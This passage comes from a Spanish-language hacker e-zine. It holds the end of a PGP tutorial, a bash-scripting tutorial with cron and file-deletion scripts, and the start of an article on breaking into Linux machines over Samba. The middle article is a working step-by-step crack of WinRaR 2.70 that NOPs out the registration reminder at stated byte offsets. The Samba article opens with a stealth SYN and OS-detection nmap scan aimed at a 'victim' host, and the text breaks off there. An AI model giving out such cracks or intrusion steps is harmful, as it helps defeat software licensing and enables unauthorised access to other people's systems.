(idclave.asc), de esta manera aplicamos copy&paste y  podemos  repartir  nuestra 
clave por mail o algun otro medio.

Bueno es hora de encriptar un mensaje, para  ello  usaremos el prgrama  pgpe, en 
esta ocacion debemos indicar el identificador de  la clave a usar  con la opcion
-r, tambien para poder enviar el  mensaje  cifrado  atraveas de  cualquier medio 
usaremos -ta que como ya lo habia  mencionado genera un  archivo de texto  plano
legible, ahora me envio un mensaje a mi mismo.

bash# pgpe -ta -r elektr0 passwords.txt

Se creara el archivo passwords.txt.asc, podriamos  indicarlo al programa que nos 
deje a nosotros darle el nombre que queramos con la opcion -o:

bash# pgpe -ta -r elektr0 passwords.txt -o shadow.pwd

Tambien tenemos la posibilidad  de  firmar  conjuntamente  como  se  encripta un
mensaje, esto es bastanta  recomendable  asi  el  destinatario  podra  saber  si
efectivamente se trata de nosotros a traves de nuestra firma:

bash# pgpe -sta -r elektr0 -u elektr0 /etc/shadow -o shadow.asc

De acuerdo con el anterior ejemplo solo se  han  agregado  la opcion -s que  le
indica al programa (/pgpe) que queremos firmar nuestro mensaje, la opcion -u es 
el identificador  de  la  clave que  queremos  usar en este caso  es  el  mismo
identificador de clave que la opcion -r.

Ahora si quiesieramos solo firmar un mensaje entonces usamos  el programa pgps:

bash# pgps -u elektr0 -ta mensaje.txt

Asi se creara el archivo  mensaje.txt.asc en el que se  incluye nuestra  firma,
adjunto al mensaje.

Hemos recibido  un  mensaje  encriptado, queremos  desencriptarlo y  a  su ves
verificar de que efectivamente corresponde de la perona que nos lo envio:

bash# pgpv archivo.asc

Si quisieramos agregar una clave  publica  de algun amigo nuestro bastaria con 
teclear:

bash# pgpv archivo.asc

Donde archivo.asc es donde se  encuentra la  clave  publica de  nuestro amigo, 
pgpv se encarga de todo lo demas... Bueno ese es mas bien el uso normal basico
y cotidiano que se le podria dar a pgp, porsupuesto que pgp puede hacer muchas 
otras cosas, tiene otras muchas mas opciones que en un futuro quisas  explique
por ahora quienes quieran saber mas de pgp:

http://www.pgpi.com
http://www.distributed.net

EleKtr0
elektr0@est.cl
http://www.est.cl/


[=========================([ Electron Security Team ])===========================]





[====([ meth0dist ])=======================================================EST-4=]
[====([ Crackeelo Ud. Mismo ])===============================================#16=]
[==========================================================([ meth0dist@est.cl])=]


Hola a todos nuevamente. En este articulo voy a hablar sobre como  crackear tus
propios programas, sin tener que depender de otra persona persona para hacerlo.
El programa  que  vamos  a crackear va a ser el WinRaR 2.70. Necesitaras  estas 
herramientas:

-W32dasm (yo tengo la version 8.93)
-Hiew of un heditor hexadecimal (tengo la version 6.11 del Hiew)

Ojo: a veces cuando abres un .exe con  el Hiew y pones F3 para  editarlo talvez
te diga que no puede, esto debido a ke se encuentra en modo de read no mas, asi
ke te recomiendo copiar el .exe original y abrir el copiado para  evitarnos  si
hay algun problema mas tarde. Si crackeas mal el programa al correrlo puede que
te tire error y talves windows se te quede pegado :P asi que cuidado con lo que
hagan.

En esta pagina podras encontrar varias herramientas utiles como lo son SoftIce,
algunos debuggers etc.

http://www.programmerstools.com/


Para comenzar quiciera contarles un poco  lo que me paso con este  programa. Lo 
que pasaba era que al no tenerlo registrado, cada vez que lo ejecutaba me salia
una  ventana  chica, con el titulo "Please register", ya que  se habian acabado
los dias  de prueba del  programa. diciendome  que por favor me registrara, con 
una serie de opciones como ir a la web oficial de WinRaR, registrarme en linea, 
cuanto me  costaria (como si lo fuese a pagar poh, demas :P !), sitios de donde 
se puede comprar, cerrar  la ventana y ayuda. Eso era  lo que  no me gustaba ya
que apenas abria el WinRaR, a los dos segundos me salia esa maldita ventana que 
tenia que cerrar, por lo que me dije a mi mismo: "Por que mejor hacer que no me 
salga esa ventana". Asi que lo  primero que hice fue abrir el WinRaR.exe  en el 
W32dasm. Paciencia que  se demora un poco, ya que el .exe del  WinRaR pesa como 
sus 500 kilobytes. Cuando se abrio, lo primero que  hice fue hacer  click en el 
menu : "Search", luego  "Find Text". Entonces  puse buscar  la oracion: "Please
Register". Esto fue lo que encontre:

Name:  REMINDER, # of Controls=007, Caption: "Please register", Classname:""

 001=ControlID:0066, Control Class:"BUTTON" Control Text:"&Online registration"
 002=ControlID:0065, Control Class:"BUTTON" Control Text:"&Price list"
 003=ControlID:0067, Control Class:"BUTTON" Control Text:"&Sites list"
 004=ControlID:0001, Control Class:"BUTTON" Control Text:"Close"
 005=ControlID:0009, Control Class:"BUTTON" Control Text:"&Help"
 006=ControlID:FFFF, Control Class:"BUTTON" Control Text:""
 007=ControlID:FFFF, Control Class:"STATIC" Control Text:"Please note that...."

La palabra "REMINDER", me dio la idea de buscarla en "String Data References", 
por lo que hice click en "Refs" y luego en "String Data References". Cuando se
abrio esa ventana me puse a buscar "REMINDER" y lo encontre. Ahora hagan doble
click en el y llegaran a lo siguiente:

* Possible StringData Ref from Data Obj ->"REMINDER"
                           |  
:00401544   68E73B4600     push 00463BE7
:00401549   8B0D20CC4600   mov ecx, dword ptr [0046CC20]
:0040154F   51             push ecx

Como pueden notar esto era lo que hacia que el programa llamara a esa  maldita 
ventana, para recordarme que me tenia que registrar ("REMINDER"), cada vez que
entraba al WinRaR. Pense que cambiando la segunda linea  por puros "nop" (90),
haria que no me apareciera, pero pense mal, ya que al ejecutar el programa, se
me quedaba pegado, asi que la solucion fue simple: cambiar todo por puros 90's
para que no hiciera nada el WinRaR al abrirlo.
Primero anote las tres "offset location" de  cada  linea.

El "offset location" de la primera linea es: "@Offset 00000B44h" 
El "offset location" de la segunda linea es: "@Offset 00000B49h" 
El "offset location" de la tercera linea es: "@Offset 00000B4Fh" 

Recuerden que la "h" al final de los "offset location" quiere decir hexdecimal.
Luego ejecute el "Hiew.exe"  y abri el  "WinRaR.exe". Luego  presione "F5" para 
buscar, y puse la  primera "offset location" : "00000B44", y presione "F3" para
editarlo y escribi: "9090909090", presionando  despues "F9" para  actualizarlo. 
Luego  busque las  otras dos "offset location", sustituyendo la  segunda por  : 
"909090909090", y la tercera  por : "90". Luego un "F9" para  actualizar y sali
del programa. Listo!. Ahora abri el WinRaR.exe y no me salio la maldita ventana.
Alivio!!, ya estaba librado de esa maldicion!!!.

Aca los dejo con algunas de las instrucciones :


Inc Eax    Suma un digito           (Increase Eax          )        40

Dec Eax    Resta un digito          (Decrease Eax          )        48

JB         Salta si bajo            (Jump if Below         )        72

JE         Salta si es igual        (Jump if Equal         )        74

JNE        Salta sino es igual      (Jump if Not Equal     )        75

JNA        Salta sino sobre         (Jump if Not Above     )        76

JA         Salta si sobre           (Jump if Above         )        77

JL         Salta si menor           (Jump if Less          )        7C

JLE        Salta si menor o igual   (Jump if Less or Equal )        7E

NOP        Ninguna Operacion        (No Operation          )        90

RET        Retorna                  (Return                )        C3

JMP        Salta                    (Jump                  )        EB



Ya kabros, los  dejo  con esto para que  se entretengan un  rato  tratando de 
crackear algun programa, pa que funcionen  como ustedes  quieran y no como el 
programador  que  los hizo  quiera. Recuerden que si uno no  crackea  bien el
programa, se puede quedar pegao el programa y en  este caso windows. Por esto
es   que  linux   es   mucho   mejor   a  la   hora  de  crackear  programas.
Cualquier error que haya me lo hacen saber a mi mail. Ya lokos, nos vemos y a 
practicar!!


[=========================([ Electron Security Team ])===========================]





[====([ Reox ])============================================================EST-4=]
[====([ Aplicaciones Utiles e inutiles del Bash ])===========================#17=]
[=======================================================([ maray@inf.utfsm.cl ])=]


Hola... aqui va mi tercer texto para esta e-zine,  ojale  les  guste  :). En  este
texto veremos  las  bondades  de  linux  a  travez  de  su interprete de comandos,
veremos como usarlo para nuestros fines, desde los mas comunes y cotidianos, hasta
lo mas extravagante e inutil posible. Este texto no es para gente que no sepa nada
de Shell-Script, da por asumido problemas de ejecucion, sintaxis y conocimiento de 
comandos, sin  embargo  tiene  ideas  interesantes para aquellos que saben un poco 
mas. Si  deseas  aprender Shell-Script, busca en  Internet, hay  bastantes  textos
buenos, interesantes  y  traducidos... Por  eso creo que no vale la pena empezar a
ense~ar este lenguaje en esta e-zine.

1-. INTRODUCCION:

El  shell  scripting  suele  ser  visto  como un  arma poco poderosa y compleja de
realizar; los fanaticos de C no entienden que ventajas trae el bash en comparacion 
al lenguaje en cual fue creado, sin  embargo, aqui  veremos  ciertas  aplicaciones 
utiles e  inutiles  de  esta  singular  forma  de scripting. Si bien este texto no 
pretende  ser un curso  de Programacion  en  Bash, siempre  es  clave  destacar y 
resaltar ciertos conceptos.

1.1-. El Shell. 

La definicion formal de Shell es: Interprete de Comandos. Esto significa que es el
encargado  de  comunicar   al   usuario   con  el  Kernel. Aqui  vemos  que  Linux
diferencia esas dos partes, Kernel  y  Shell. El nucleo del sistema (kernel) es el
encargado de transformar el proceso en material legible por el monton de silicio y
electrones  que  entendemos  por  Hardware. A  su  vez, el  kernel  administra los
procesos y les da  forma para  ser  funcionales; el kernel administra los recursos
del equipo para que este funciones y asi y asi.. el kernel es casi el OS completo. 
Sin embargo, el usuario es el que usa el Pc, y este debe tener una forma amigable, 
confiable y segura de interactuar con este. Ahi nacen los interpretes de comandos, 
que transforman comandos simples e intuitivos en informacion  util para el nucleo.
Si bien un Shell no es la uncica  forma  de  interactuar  con el Pc (existen otros 
como los interpretes GUI, como  Windorf, X, Mac Os, etc si es la mas adecuada para
labores de  administracion, programacion, investigacion, etc. Existen muchos tipos
de shell, durante este texto  hablaremos siempre de bash (Bourne Again Shell), sin
embargo  existen  otros  como  el  sh (Bourne Shell), tcsh (C Shell Avanzado), ash 
(Shell Reducido), ksh, pdsh, csh, zsh, etc. Si  por  casualidad no sabes que shell
estas usando pon en tu interprete: ps |grep $$.

1.2-. El Shell-Script.

La unica  gracia del Shell-Script es poder realizar ciertas cosas muy complejas de
forma muy sencilla, pero a su  vez  es  un lenguaje  extremadamente  ineficiente y 
obviamente limitado por el SO utilizado, la version del Interprete y la estructura
extremadamente formal necesaria. El shell-script, a grandes rasgos, no  es mas que
un conjunto   de  comandos que  se  ejecutan  secuencialmente linea por linea, los 
cuales pueden ser ejecutados  individualmente  sin problemas. Generalmente  se usa
para secuencias de comandos recursivos que se quieren  ejecutar una y  otra vez, y
asi no tener que escribirlos  cada vez. Por  ejemplo, el archivo /etc/rc.local que
corresponde a ciertas preferencias, modulos o programas  que  se deseen caragar al
inicio, esta escrito  en  shell-script. Muchos  archivos  de  configuracion  estan
escritos en shell-script, como  el .bash_profile  o  el .bashrc  que  definen  las
configuraciones del  interprete de comando del usuario. Esto se  debe a  la  facil
edicion de este tipo de script, y por supuesto  al  poco  espacio  que  ocupan. El
shell-script en resumen es  usar  el  interprete  de comando, tal como si fuera un
lenguaje de programacion, y  es por aquello que este "lenguaje" depende obviamente
del interprete que utilicemos. (recuerdo que usaremos en este texto el shell BASH)


1.3-. Sobre los Comandos:

Como  dije  antes, este  no  es un curso de Shell-Script asi que  no explicare los
comandos que  utilizare, casi  todos los comandos tienen man (manuales) asi que si
no  saben como se utilizan pongan: man commando :P. En el caso que no exista ayuda
para  ese comando, probablemente  este en: man bash. Para saber de los comandos en
particular  busca en el google pues :)... Lo unico que explicare en este texto son
las tuberias (o pipes pa los gringos al peo) y redireccion (stdin, stdout,stderr). 

1.4-. Sobre las Tuberias y Redireccion:
 
El bash tiene 3 canales  basicos  de  comunicacion (E/S) con  el  Usuario, uno  de
entrada y dos de salida. El canal de entrada lleva el nombre de stdin: Standard In
(Entrada Estandar), y corresponde a  todo  lo  ingresado  por  el  usuario  en  el
dispositivo  de   entrada   primario;  el  teclado. Este  canal  lleva  el  numero 
identificador de 0, que luego veremos para que sirve. El primer canal de salida es
el stdout, que corresponde a todo texto que  se quiera imprimir en  pantalla, este
lleva el numero identificador 1. El ultimo canal, corresponde al stderr, que es el 
que imprime todo mensaje de  error. Corresponde  al descriptor 2. Es  muy  util el
tener dos canales de salida, y si bien el canal 2 no siempre  es utilizado para su
labor,  si  es  utilizado  para   diferenciar  un  tipo  de  salida  a  otra. Para
redireccionar estos canales se utiliza >, < y >>. 

Ejemplos:

  A-. Si queremos redireccionar el stdout a un fichero, utilizaremos:
 
  commando 1> fichero.log

  donde 1 corresponde al descriptor del canal. Sin embargo la salida default
  es la 1, por lo tanto podemos omitir el 1 y nos quedaria...

  comando > fichero.log

  B-.  Ahora si queremos redireccionar la salida de error (sdterr), utilizaremos:

  comando 2> fichero.log

  donde 2 corresponde a la salida de error. En este caso, siempre tiene que ir
  el 2, sino como vimos en el caso anterior, redireccionara la stdout. 

  C-. Redireccionar de stdout a stderr o viceversa:

  comando > &2

  en este caso redireccionara la salida estandar a la salida error, ya que el
  & corresponde a un redireccionador hacia descriptor.

  El caso inverso seria entonces:

  comando 2> &1

  D-. Si queremos redireccionar ambos a la vez, utilizaremos el & antes del >,
  esto es muy util para ejecutar un programa en silencio:

  comando &> /dev/null
 
  * (/dev/null es un dispositivo virtual que elimina cualquier valor que se le
  entregue. Es como un oyo negro que hace desaparecer las cosas..jejeje )

  E-. Insertar (append).

  Cuando se redirecciona una salida a un archivo, este borra lo que antes
  existia ahi y guarda lo nuevo. Para que esto no pase, utilizaremos el >>,
  que corresponde a agregar al archivo justo antes de su EOF (Final de
  archivo) la informacion enviada.

  comando >> fichero.log


Ahora, las tuberias son formas de utilizar las salidas de un programa como
la entrada de otro. Para esto se utiliza el caracter |. Ejemplo.

ps -aux |less

El programa less necesita un archivo para ejecutarse, sin  embargo  con  un
pipe (tuberia) podemos darle al less una serie de informacion que utilizara
para ejecutarse. 

dmesg |grep eth

en este otro ejemplo, se imprimira solo las lineas que contengan eth del
extenso texto que lanza el dmesg.


2-. Aplicaciones Utiles e Inutiles

Ahora vamos con lo interesante:
 
El  bash, es  muy util para crear programas que interactuen con el usuario, no asi
para realizar simples llamadas o calculos  matematicos. Por lo  tanto comenzaremos 
con lo mas simple (secuencia de comandos):

2.1-. Secuencia simple de comandos.

Por ejemplo vamos a ver las cuatro lineas para hacer funcionar una unidad
Zip (iomega):

------------------------
#!/bin/bash
#Programa de instalacion de Iomega Zip

#modulos
insmod partport
insmod parport_pc
insmod ppa

#montado de la unidad
mount /mnt/zip

#end
------------------------
Este script funciona siempre y cuando el directorio /mnt/zip este creado y el
/etc/fstab editado para  una  unidad  zip. (mas adelante  volveremos  a  este
ejemplo para completarlo)


Otro ejemplo, y muy comun en estos dias, es el de ip-masquerading, donde para
realizar esto necesitamos siempre ejecutar por lo menos 3 lineas:

------------------------
#!/bin/bash
#Ipmask Skript!

#modulos
insmod ip_masq_ftp
insmod ip_masq_raudio
insmod ip_masq_irc
#insmod ip_masq_generic
insmod ip_masq_quake
#insmod ip_masq_user
insmod ip_masq_vdolive

#habilitacion y politicas
echo "1" > /proc/sys/net/ipv4/ip_forward
ipchains -P forward DENY
ipchains -A forward -s 192.168.0.0/255.255.255.0 -j MASQ

#end
-------------------------

2.2-. Secuencia de comandos con operadores unidecicionales
 
A veces, como en todo lenguaje de programacion, es necesario  utilizar condiciones
para realizar o no  ciertas  secuencias de comandos. Por ejemplo consideraremos el 
ejemplo de la unidad Zip.

-------------------------
#!/bin/bash
#Programa de instalacion de Iomega Zip

#modulos
insmod partport
insmod parport_pc
insmod ppa

#montado de la unidad
if [ `cat /etc/fstab |grep sda4 |cut -d "/" -f3` != sda4 ]; then
  echo "/dev/sda4               /mnt/zip/               vfat    noauto,owner 0 0" >> /etc/fstab
  mkdir /mnt/zip &> /dev/null;
fi

mount /mnt/zip

#end
--------------------------
 
En este ejemplo, solo a~adimos una secuencia de comandos, cuando el device sda4 no
este en el fichero /etc/fstab, para  esto  utilizamos los comandos grep y cut para
moldear la  salida  del  cat. Luego  cuando esta condicion se culple, agregamos la 
linea que pueda faltar en el fichero, y por ultimo  creamos el directorio, en caso
que este exista lanzara un mensaje de error que se direccionarar al /dev/null, que
como ya dijimos, es como un agujero negro donde desaparecen las cosas :).

Que tal si complicamos mas el asunto. Supongamos que tenemos un ISP que nos ofrece
conexion banda ancha, y tenemos un server linux corriendo. A  su  vez el ISP, solo
nos ofrece ip dinamica por dhcp y nosotros queremos  simpre  saber  el ip, cosa de
poder trabajar en  nuestro  server  de  cualquier  parte del mundo. Supongamos que
tenemos una cuenta  de  correo  ajena a nuestro server o bien un celular con mail. 
Entonces:

--------------------------
#!/bin/bash

#cambio de ip

if [ "`ifconfig |grep addr: |cut -d ":" -f2 |cut -d " " -f1 `" != "`cat /var/ipback`" ]; then
   ifconfig |grep addr: |cut -d ":" -f2 |cut -d " " -f1 > /var/ipback
   echo "Ip cambio a: " `cat /var/ipback` | mail TuMail@TuIsp.com;
fi

#end
--------------------------

Esto comparara el ip actual, con uno guardado por  el mismo programa en el archivo
/var/ipback, y en el  caso  que  no fuere  el  mismo,  este  cambiara  el  archivo
/var/ipback por el ip  nuevo  y  enviara  un  e-mail  a  tu  celular  por  ejemplo 
diciendote "Ip cambio a: 200.69.69.69", ¿bastante comodo no?

Sin embargo este programa no soluciona nuestro problema, ya  que  hay  que estarlo
ejecutando cada vez que querramos saber si el  ip  cambio, y  eso  no tiene ningun
sentido. Para areglar esto  veremos  dos  soluciones, el simular un demonio con un
while infinito, y  usar  el  famoso cron, para ejecutar esto a cada cierto tiempo.

2.3-. Utilizando While... (Simulando Demonios)

Una aplicacion muy practica del while, es  el  while  infinito... Por  ejemplo: si
queremos realizar un programa de seguridad, que siempre este buscando por acciones
"extravagantes" podemos utilizar este while...

Ahora, volvamos al ejemplo del Ip:

--------------------------
#!/bin/sh


echo "GetNewIp: Loaded"
echo "" > /var/ipback
while [ 1 ];
do
if [ "`ifconfig |grep addr: |cut -d ":" -f2 |cut -d " " -f1 `" != "`cat/var/ipback`" ]; then 
   ifconfig |grep addr: |cut -d ":" -f2 |cut -d " " -f1 > /var/ipback
   echo "Ip cambio a: " `cat /var/ipback` | mail TuMail@TuIsp.com;
fi
sleep 90m
done

#end
--------------------------

Como todo lenguaje, los condicionantes funcionan con 1 = TRUE, y 0 = FALSE, por lo
tanto el while [ 1 ], indica que siempre es verdadero, por  lo  tanto es infinito. 
Agregamos a esto el  sleep  90m, que  hace  dormir  el programa durante 90 minutos 
antes de seguir ejecutandose. Esto simulara  la  funcion  de  un demonio siempre y
cuando este ejecutandose siempre... Para esto  ocuparemos  en  comando  nohup, que
mantendra el comando ejecutandose aunque el usuario que lo ejecuto no este logeado.
Para que no  ocupe  un  tty  o  pts, ocuparemos  tambien  el  metacaracter &, para 
ejecutarlo en segundo plano, asi tendremos el comando: 

nohup bash programa.bash &

Este comando lo podemos  agregar al /etc/rc.local, o  a  otro  fichero  de  inicio
(/etc/rc.d/init.d/) para  que  se  ejecute. La  unica  forma  de parar este pseudo 
demonio es matando el proceso directamente (kill -9 pid) o rebooteando el sistema.

Ademas  este  tipo  de  "pseudo-demonio" tiene  la  ventaja  de ser ejecutado  por
cualquier usuario, siempre y cuando tenga acceso al nohup... Esto es muy util para
hacer cosas que el administrador cree que no podemos hacer ;)

Sin embargo, este metodo no es muy efectivo en el sentido que ocupara recursos en
el sistema, si bien dejamos el proceso en sleep mode, este  siempre existira como
proceso. Si tenemos 20 de estos  pseudo  demonios  corriendo, la rentabilidad del
sistema empezara  a  decrecer. Para  subsanar este problema, existe un demonio en
particular  que  ejecuta los  programas  a cada cierto tiempo especificado, y asi 
tendremos  un  demonio  solamente... Este demonio se llama crond (cron daemon), y
viene del latin cron = tiempo... (ese fue el momento curturarr del tersto).

2.4-. Utilizando Cron. (tiempos de ejecucion)

A ver... El crond, es un demonio  que  nos  permite  ejecutar ciertos programas o 
secuencia de comandos en un tiempo  predeterminado  sin que se  tenga  que  estar
presente. Es decir es como un reloj que activa ciertas cosas a cada cierto tiempo
especifico. Hay dos formas de utilizar el crond, una dise~ada para ejecuciones de
administracion (para el cual nesecitas ser root) y la otra  es dise~ada para cada
usuario  respectivamente  (siempre  y  cuando  el  administrador  lo permita). La 
primera  es mucho  mas  sencilla de realizar, y consta en agregar un shell-script
con todo  lo  que  se quiere hacer en el directorio predeterminado para esto. Los
directorios tienen definido un tiempo de ejecucion segun su nombre:

/etc/cron.hourly  = Cada Hora
/etc/cron.daily   = Cada Dia
/etc/cron.weekly  = Cada Semana
/etc/cron.monthly = Cada Mes

Ahora... Recuerda que para incluir un shell-script en estos directorios
debes configurarlo como ejecutable (chmod +x [archivo])

Pasemos al segundo metodo:

A veces necesitamos ser un poco mas  especificos en  nuestras  configuraciones de
tiempo, por lo tanto crond  nos  ofrece algunos  crontab  para  este motivo. Cada
usuario  puede  tener su  propio crontab, sin  embargo esta  opcion tiene que ser 
habilitada por el administrador. Existe un crontab que  siempre existe, que  esta
en /etc/crontab, y este tiene configuraciones destinadas a la administracion  del
sistema. Las lineas de configuracion de este archivo consisten en 6 campos, los 5
primeros  para la  configuracion del espacio  temporal (shia!!), y  el ultimo que
contendra el comando a ejecutar. Si el  campo no va a  ser utilizado sera marcado
con un "*" que indicara que la condicion es siempre verdadera. A  ver, esto nunca
queda claro hasta que se da un ejemplo... Pero antes definiremos los campos y sus
intervalos.

1-. minuto      0-59
2-. hora        0-23
3-. dia(mes)    1-31
4-. mes         1-21
5-. dia(semana)  0-6 (0 = Domingo)

Entonces:

1) Imaginemos que queremos saludar a Pablito Perez en el dia de su cumplea~os, 
   que cae el 24 de octubre.

0 0 24 10 * echo "Feliz Cumplea~os Pablito!!" | mail pablito@perez.com

Si observamos los campos veremos que en el minuto 0 de la hora 0 del dia 24
del mes 10, mandara un mail con ese texto. Fijense que el dia de  la semana
no importa para esta ejecucion por lo tanto se marca con un "*" para que no
sea condicion para el envio

2) Ahora queremos borrar el archivo core del directorio del root todos los
dias habiles de la semana (lunes a viernes) a las 04:30 am.

30 4 * * 1-5 rm -f /root/core

Ahora vemos que los "*" estan en los campos que no nos interesan (dia y
mes), pero definimos un intervalo de dias de la semana con el indicador "-"

3) A veces, cuando se esta programando o configurando el sistema, a uno se
le olvida ir a alimentarse, lo que es muy malo para  nuestra salud, por lo
tanto vamos a imprimir  un mensaje para  todo los usuarios, que es hora de
comer algo a las 13:30 hrs y a las 20:30 hrs. :)

30 13,20 * * 0-6 wall Hora de alimentarse... maldito computin...

Vemos aqui por ultimo el indicado "," que nos permitira definir distintos
valores para los campos determinados...

Estos ejemplos son  bastante  burdos  e  ilogicos, sin embargo  el crond  es
realmente util para labores de administracion. El shell-script es usualmente
utilizado en conjunto del crond... las razones son evidentes.

2.5-. El For y Listas de Referencia.

El la programacion en  bash, permite ademas ahorrarse  burdas  repeticiones e
interminables  suseciones que  no  son   nada   entretenidas... Las listas de
referencias son  archivos  o  operaciones que contienen informacion que pueda
ocuparse  para  un  programita  en  bash, contienen  informacion  listable  y
utilizable para nuestros  propositos. El  for, por  otro  lado,  nos  permite
utilizar estas listas  para  no  tener que escribir para cada campo un codigo
distinto. Ejemplo:

1) Queremos cambiar todos los .bash_profile de nustros  usuarios  y  ponerle
un  lindo  logo   de  inicio. El  .bash_profile   lo   tenemos  guardado  en 
/root/usr/resp/.bash_profile y queremos copiarlo a los 23 usuarios que tengo
en el server. Si bien lo podemos hacer manualmente, me  voy a morir  de pena
haciendolo...  Ademas  supongamos  que  tenemos  una  lista  de  usuarios en
/root/usr/list.txt :

---------------------------
#!/bin/bash

#Copiador de .bash_profile

for $vari in `cat /root/usr/list.txt`; do
 cp /root/usr/resp/.bash_profile /home/$vari/
 chown $vari /home/$vari/.bashprofile
 chgrp usr /home/$vari/.bashprofile;
done
---------------------------

Listo... Copiados  y  chowniados. Ahora, si  queremos  agregar  un  usuario, 
simplemente  lo  agregamos  a  list.txt  y se  acabo. Ahora si queres que el
programa fuere autosuficiente, le cambiamos  el `cat /root/usr/list.txt` por
`ls /home/` con lo que no tendremos  que  tener  una lista, sin embargo, hay
ocaciones que el programa no podra ser autosuficiente...

2) Echemos  a  volar nuestra imaginacion nuevamente... Propongamos una  lista
de ficheros  que  deseemos borrar, por ejemplo todos los ficheros core, todos
los ficheros *sex*, *exploit* o cosas asi de los directorios de los usuarios.
Creamos entonces  un  archivo  llamado noallow.ref, con  todas  las  posibles
combinaciones de archivos inutiles y prohibidos:

---------------------------
#!/bin/bash

#borrador de archivos inutiles y prohibidos

for $vari in `cat /root/noallow.ref`; do
  for $varo in `locate /home/vari`; do
   rm $varo -f
  done
done
----------------------------  

Esto funcionara siempre y cuando seamos root :), y el locate este actualizado.
Agregamos esto al crond (ya explicado) y  listo... borramos  todo  lo  que  no
queremos en nuestro server, incluso cuando estemos de vacaciones en futaleufu.

2.6-. Lo mas inutil de lo inutil...

Ya vamos llegando al final de esta primera parte del texto, por  lo que  vamos
a aprender a ocupar dialog, una herramienta que  traen ciertas  distribuciones
que permite crear cuadros de dialogo con colores menues y ventanitas varias...

El dialog simula la programacion  con  ncurses, sin embargo es tan sencillo que
aveces no puedes evitar jugar con  el. Si  no lo tienes puedes buscar el rmp en
la pagina de redhat, si no tienes redhat anda a tu pagina favorita de tu distro
y baja el tar.gz o el binario. 

No voy a explicar la sintaxis de este comando, ya que puedes hacer un man
dialog antes de continuar...

Ejemplos:

1) Hagamos una encuesta a nuestros usuarios de el ranking a nuestro servidor
cada vez  que  se  conecten. Ademas  agregaremos  un cuadro de dialogo donde
podran  escribir  los  comentarios  pertinentes.  Para  esto  crearemos  dos
archivos con chmod 777, el /var/encuesta y el /var/sugerencias
----------------------------------------------------------------
#!/bin/bash

#Encuesta Inutil

dialog --backtitle "FreeDragon.linux-site.net Server |     Red Hat Linux
7.0: Kernel 2.2.16-22"  --msgbox "Bienvenido al servidor de Reox \n
<<<|FreeDragon|>>>" 0 0
dialog --msgbox "Bienvenido: Se realizara una encuesta para su mejor
antencion"
0 0
echo "0" > /tmp/temp.mau
dialog --menu "Como considera este servidor?:" 100 100 5 1 "De muy baja
categoria" 2 "Malo, pero igual tengo que ocuparlo" 3 "Regular, pero
mejorable" 4 "Muy Bueno, gracias al root" 5 "Lo mejor que conozco" 2>
/tmp/temp.mau
if [ "cat /tmp/temp.mau" != "0" ]; then
echo $HOME |cut -d "/" -f3 >> /var/sugerencias
clear
dialog --inputbox "Alguna sugerencia?" 100 100 "Yo Propongo:" 2>>
/var/sugerencias
echo " " >> /var/sugerencias
echo $HOME |cut -d "/" -f3 >> /var/encuesta
cat /tmp/temp.mau >> /var/encuesta
echo " " >> /var/encuesta
fi
----------------------------

esto lo agregamos para que corra en el .bash_profile de cada usuario y
listoco... Bueno leanse en man dialog y les aseguro que alguna vez les
servira... 

3.-. Despedida

Bueno eso fue toda la primera parte de "Aplicaciones  Utiles  e  inutiles  del
Bash", cuando aclare unas peque~as dudas vuelvo a escribir la segunda parte...

Recuerden que las e-zines y documentos electronicos no es  la unica  forma  de 
aprender, sino que  existen  numerosos  trabajos  universitarios, monografias,
tesis y cosas mas  serias  que  este  texto... Los  libros  si bien son caros,
sigue siendo la mejor forma de aprender  informatica... asi  que  partiron los
ni~itos a comprar un libro y a practicar harto :P

Bueno... Chaoz... Nos vemos...

Reox
-----------------------
maray@inf.utfsm.cl
irc.terra.cl 6667 #electron #informatica #linux
www.freedragon.linux-site.net (ojala que me pillen prendido) :P
-----------------------


[=========================([ Electron Security Team ])===========================]





[====([ Kpanic ])==========================================================EST-4=]
[====([ Montandose a Linux con Samba ])======================================#18=]
[==========================================================([ kpanic@mail.com ])=]


Requiere: un Sistema Operativo Linux con nmap, smbclient y smbmount como root ;)


                              TABLA DE CONTENIDOS



   1. Que es nmap...........................................sec.  1

   2. Que es samba..........................................sec.  2

      2.1   smbclient
      2.2   smbmount

   3. Al abordaje muchachos.................................sec.  3

   4. Feed-back.............................................sec.  4


============================================================================
1>                            QUE ES NMAP
============================================================================

    nmap  -  Herramienta  de  exploracion  de  red y  escaner de seguridad.
	      

    Como su descripcion dice es una herramienta de EXPLORACION ;) y scanner 
    de  seguridad  para  grandes  redes.   Permite ver  que  maquinas estas 
    activas (live) y los servicios que ofrece.
    Nmap puede dar mucha informacion, como  el sistema operativo y  es  muy 
    facil de usar.
    Es una herramienta con la cual ningun sysadmin o hacker puede vivir :)=

NOTA:
    La pagina del maual en espanol esta en 
    http://www.insecure.org/nmap/nmap_manpage-es.html
    Si no lo tienes intalado puede bajarlo de http://www.insecure.org/nmap/


============================================================================
2>                            QUE ES SAMBA
============================================================================
2.0   SAMBA
    Es una Suite para conectar servidores SMB/CIFS mas conocidos como Windows
    
2.1   SMBCLIENT
    Es un cliente para redes microsoft  para trabajo en  grupo similar  a un 
    cliente  FTP,  forma  parte de  la  suite  Samba y  permite 'hablar' con 
    servidores SMB/CIFS. Nos muestra los recursos compartidos de una maquina
    windows u otro S.O. con Samba.
    Mas informacion en : man smbclient 

2.2   SMBMOUNT
    Al igual que el comando mount, smbmount nos permite montar volumenes o
    recursos  compartidos  en  nuestra  estructura de directorios para asi 
    poder leer y escribir, segun la configuracion del  servidor.
    Mas Informacion en : man smbmount


============================================================================
3>                            AL ABORDAJE MUCHACHOS
============================================================================
 1) Entramos como root a nuestra maquina favorita :)
 2) Escaneo de maquinas
    con nmap vamos  a dar un vistaso en  la red  si existen  maquinas con el
    puerto 139  abierto y que  tambien tengan  Linux como S.O. , entonce con 
    nuestra cuenta de root y le ponimo':
    OJO: Las IPs son de ejemplo, no necesariamente funcionan, ni lo intenten
    ------------------------------------------------------------------------ 
    #nmap -sS -O -v -v -p139,80 victima
    y el resultado deberia parecerse a esto:
     
    Starting nmap V. 2.3BETA14 by fyodor@insecure.org (www.insecure.org/nmap/)
    Host  (IPDELAVICTIMA) appears to be up ... good.
    Initiating SYN half-open stealth scan against  (IPDELAVICTIMA)
    Adding TCP port 139 (state Open).
    Adding TCP port 80 (state Open).
    The SYN scan took 1 seconds to scan 2 ports.
    For OSScan assuming that port 80 is open and port 43063 is closed and
    neither are firewalled
    Interesting ports on  (IPDELAVICTIMA):
    Port    State       Protocol  Service
    80      open        tcp       http
